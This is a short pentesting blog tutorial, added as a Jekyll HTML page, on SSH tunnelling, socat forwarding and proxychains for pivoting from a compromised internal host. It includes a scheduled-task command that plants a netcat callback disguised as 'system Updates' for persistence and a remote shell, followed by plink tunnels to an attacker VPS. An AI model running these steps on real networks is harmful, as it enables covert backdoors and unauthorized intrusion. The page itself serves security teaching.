@@ -1,0 +1,575 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.23.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Understanding SSH Tunnelling and Proxychains - The Rosh</title>
+<meta name="description" content="Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events.">
+
+
+  <meta name="author" content="Jaimandeep Singh">
+  
+  <meta property="article:author" content="Jaimandeep Singh">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="The Rosh">
+<meta property="og:title" content="Understanding SSH Tunnelling and Proxychains">
+<meta property="og:url" content="https://cyber-rosh.github.io/musings/ssh-tunnel/">
+
+
+  <meta property="og:description" content="Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-06-07T00:00:00+05:30">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://cyber-rosh.github.io/musings/ssh-tunnel/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "The Rosh",
+      "url": "https://cyber-rosh.github.io/musings/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/musings/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/musings/">
+          The Rosh
+          <span class="site-subtitle">A collection of musings on cyber security</span>
+        </a>
+        <ul class="visible-links"></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Jaimandeep Singh</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Cybersecurity Professional.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+            <li><a href="https://github.com/jai-the-seeker" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/jaimandeep-singh-07834b1b7" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:karma.jaimandeep@gmail.com">
+            <meta itemprop="email" content="karma.jaimandeep@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Understanding SSH Tunnelling and Proxychains">
+    <meta itemprop="description" content="Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events.">
+    <meta itemprop="datePublished" content="2021-06-07T00:00:00+05:30">
+    
+    
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Understanding SSH Tunnelling and Proxychains
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-06-07T00:00:00+05:30">June 7, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events.</p>
+
+<h1 id="problem-statement">Problem Statement</h1>
+<p>We have gained an initial foothold on one of the internal system of an organization. Now, we want to pivot to other systems and for this we require to run <code class="language-plaintext highlighter-rouge">nmap</code> scans on the internal networks. May be the organization is also running an internally hosted website which is not accessible from outside.How do we expose the internal ports/traffic to the outside attacker machine so that we can run our tools and gain access to resources which are not exposed to the outside world?</p>
+
+<h1 id="setup">Setup</h1>
+<p>The setup is given in figure below:</p>
+
+<p><img src="../assets/images/2021-06-07-ssh-tunnel-fig-1.png" alt="Deployment Architecture of Application" class="align-center" />
+For our penetration testing of the website we have been given a PC where we can setup the proxy. In penetration testing terms let’s call it a <code class="language-plaintext highlighter-rouge">victim</code> PC.</p>
+
+<h1 id="actions-at-victim-machine">Actions at Victim Machine</h1>
+<h2 id="step-1-optional">Step 1 (Optional):</h2>
+<p>Let us assume,we have made an entry into the task scheduler of the victim machine. It will run the <code class="language-plaintext highlighter-rouge">netcat.exe</code> once it boots up and will connect with the listener running in the Kali machine.</p>
+
+<p>Let’s make the task scheduler entry, to run the task once a day</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Make entry in task scheduler
+ SCHTASKS /CREATE /SC DAILY /TN "SystemTask\system Updates" /TR "c:\Users\Dell\AppData\Roaming\WinUpdate\netcat.exe" /ST 10:00
+</code></pre></div></div>
+<h2 id="step-2">Step 2:</h2>
+<p>Once, we get the victim machine command prompt back to our Kali machine, we will start the <code class="language-plaintext highlighter-rouge">socate.exe</code>. This program will forward the traffic to its local port:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socate.exe TCP-LISTEN:8080,fork,reuseaddr TCP:&lt;target-server-ip&gt;:443
+</code></pre></div></div>
+<p>Once the traffic has been forwarded to a specific port, in our case <code class="language-plaintext highlighter-rouge">8080</code>, we can verify the same through <code class="language-plaintext highlighter-rouge">netstat</code> command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Now check if the port has been forwarded
+netstat -ano // check connection
+</code></pre></div></div>
+<h2 id="step-3">Step 3:</h2>
+<p>We will redirect the traffic of the victim PC to the Virtual Private Server (VPS) through SSH tunnel, using <code class="language-plaintext highlighter-rouge">plink.exe</code> for windows.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Connect with VPS
+plink.exe -l &lt;username&gt; -pw &lt;password&gt; -R 8080:127.0.0.1:8080 &lt;vps ip&gt;
+</code></pre></div></div>
+
+<h1 id="actions-at-vps-machine">Actions at VPS Machine</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># To check with curl
+/etc/hosts
+127.0.0.1 &lt;domain-name&gt;
+</code></pre></div></div>
+<h1 id="forward-traffic-to-kali-machine-from-vps">Forward Traffic to Kali Machine from VPS</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># On Kali Machine
+ssh -g -L 8080:localhost:8080 -f -N &lt;username&gt;@&lt;vps ip&gt; // this use when want to open localhost
+</code></pre></div></div>
+<h1 id="now-open-the-browser-and-enter">Now open the browser and enter</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://&lt;domain-name&gt;:8080
+</code></pre></div></div>
+
+<h1 id="configure-socks5-proxy">Configure SOCKS5 proxy</h1>
+<h2 id="actions-at-victim-machine-1">Actions at victim machine</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>plink.exe -l &lt;username&gt; -pw &lt;password&gt; -D 8080:127.0.0.1:8080 &lt;vps ip&gt;
+</code></pre></div></div>
+<h2 id="actions-at-vps">Actions at VPS</h2>
+<h3 id="install-proxychains">Install proxychains</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ yum install proxychains
+$ nano /etc/proxychain.conf
+socks5 &lt;vps-public-ip&gt; 8080
+</code></pre></div></div>
+<h2 id="check-on-terminal">Check on terminal</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ proxychains curl www.myweb.com
+</code></pre></div></div>
+<h2 id="on-kali-machine">On Kali Machine</h2>
+<h3 id="do-settings-in-the-browser-if-we-want-to-open-websites-in-browser">Do settings in the browser, if we want to open websites in browser</h3>
+
+<h3 id="in-case-you-want-to-use-terminal-for-traffic-and-not-browser-perform-following-steps">In case you want to use terminal for traffic and not browser, perform following steps</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ yum install proxychains
+
+# nano /etc/proxychain.conf
+socks5 &lt;vps-public-ip&gt; 8080
+</code></pre></div></div>
+<h2 id="check-on-terminal-1">Check on terminal</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ proxychains curl www.myweb.com
+</code></pre></div></div>
+
+<h4 id="reference">Reference</h4>
+<ul>
+  <li>https://pswalia2u.medium.com/ssh-tunneling-port-forwarding-pivoting-socks-proxy-85fb7129912d</li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-06-07T00:00:00+05:30">June 7, 2021</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Understanding+SSH+Tunnelling+and+Proxychains%20https%3A%2F%2Fcyber-rosh.github.io%2Fmusings%2Fssh-tunnel%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcyber-rosh.github.io%2Fmusings%2Fssh-tunnel%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fcyber-rosh.github.io%2Fmusings%2Fssh-tunnel%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/musings/web-apps/" class="pagination--pager" title="Ideas on Scaling up Security Architecture for Deploying Web Apps
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/musings/web-apps/" rel="permalink">Ideas on Scaling up Security Architecture for Deploying Web Apps
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-05-22T00:00:00+05:30">May 22, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Let us take a case of a mid sized company which wants to scale up its security architecture for the client facing website. As per the terms of reference, the...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+  </ul>
+</div>
+
+<!-- start custom footer snippets -->
+<!-- <div class="page__footer-copyright">&copy; 2021 The Rosh. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div> -->
+<div class="page__footer-copyright">&copy; 2021 The Rosh</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/musings/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/musings/assets/js/lunr/lunr.min.js"></script>
+<script src="/musings/assets/js/lunr/lunr-store.js"></script>
+<script src="/musings/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
